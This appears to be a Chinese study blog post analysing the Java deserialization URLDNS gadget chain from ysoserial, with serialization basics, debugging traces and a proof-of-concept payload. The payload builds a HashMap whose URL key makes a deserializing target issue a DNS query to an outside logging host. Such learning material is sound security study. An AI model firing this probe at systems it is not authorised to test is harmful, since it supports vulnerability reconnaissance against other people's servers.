---
title: Java反序列化之URLDNS
date: 2023/5/1 15:00:25
categories:
- Java
tags:
- 反序列化
---

# 	IDEA

[IDEA中的debug断点调试技巧，学会真的香！ - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1887019)

[(72条消息) IntelliJ IDEA创建Servlet最新方法 Idea版本2020.2.2以及IntelliJ IDEA创建Servlet 404问题（超详细）_idea创建servlet项目_Granger_g的博客-CSDN博客](https://blog.csdn.net/gaoqingliang521/article/details/108677301)

##  ysoserial 调试

下载源码，等待maven导入依赖，再配置如下即可（java版本为java8）

![image-20230502220543589](../images/image-20230502220543589.png)



# 反序列化

## 基础

​	在java中，如果要对一个对象进行序列化或者反序列化，那么这个对象的类必须要实现`java.io.Serializable`接口。



### 函数

序列化`writeObject`

```java
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  

oos.writeObject(obj);
```

反序列化`readObject` 

```java
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  

Object obj = ois.readObject();
```



### 创建一个对象时各代码块的执行顺序

![image-20230503114055054](../images/image-20230503114055054.png)

`static {}`  →  `{}`  →  构造函数



### serialVersionUID

反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常，造成反序列化失败。

![图片](../images/1615523079000-30cnxtq.png-w331s)

SUID不同是jar包版本不同所造成，不同版本jar包可能存在不同的计算方式导致算出的SUID不同，这种情况下只需要基于目标一样的jar包版本去生成payload即可解决异常，进而提升反序列化漏洞利用成功率。



### 反序列化数据标志

`AC ED 00 05`

![image-20230913163905803](../images/image-20230913163905803.png)



## URLDNS链

分析的时候发现需要注释掉`ysoserial`重写的![image-20230502230402644](../images/image-20230502230402644.png)

> ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 SilentURLStreamHandler 类。



### 分析过程

如何寻找可能具有反序列化漏洞的类？

要有`readObject`方法，所以直奔`HashMap`的`readObject`方法

![image-20230502233642388](../images/image-20230502233642388.png)

```java
putVal(hash(key), key, value, false, false);
```

在`ysoserial`中打下断点

![image-20230502233910801](../images/image-20230502233910801.png)

跟进`put`

![image-20230502233952861](../images/image-20230502233952861.png)

跟进`hash`

![image-20230502234020014](../images/image-20230502234020014.png)

跟进`hashCode`

![image-20230502234105324](../images/image-20230502234105324.png)

跟进`handler.hashCode`

![image-20230502234135313](../images/image-20230502234135313.png)

跟进`getHostAddress`

![image-20230502235424673](../images/image-20230502235424673.png)

这里多了一步，可能是版本问题吧？

![image-20230502234312446](../images/image-20230502234312446.png)

这⾥ InetAddress.getByName(host) 的作用是根据主机名，获取其IP地址，在网络上其实就是⼀次 DNS查询。



`Gadget Chain`

![image-20230502234635733](../images/image-20230502234635733.png)

```java
HashMap.readObject()
HashMap.hash()
URL.hashCode()：Field hashCode=-1
URLStreamHandler->hashCode()
URLStreamHandler->getHostAddress()
URL->getHostAddress()    
InetAddress->getByName()
```

需要实例化三个类

```java
HashMap
URLStreamHandler
```

无参构造，直接`new`

```
URL
```

![image-20230503000931008](../images/image-20230503000931008.png)

payload

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class URLDNSTestDemo implements Serializable {

    public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {

        HashMap hm = new HashMap();

        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
        };
        String url = "http://123.1020fd40.ipv6.1433.eu.org";

        URL u = new URL(null, url, handler);

        // 通过反射修改私有属性hashCode为-1
        Class clazz = u.getClass();
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, -1);

        hm.put(u, url);
    }

}
```

![image-20230503001328190](../images/image-20230503001328190.png)

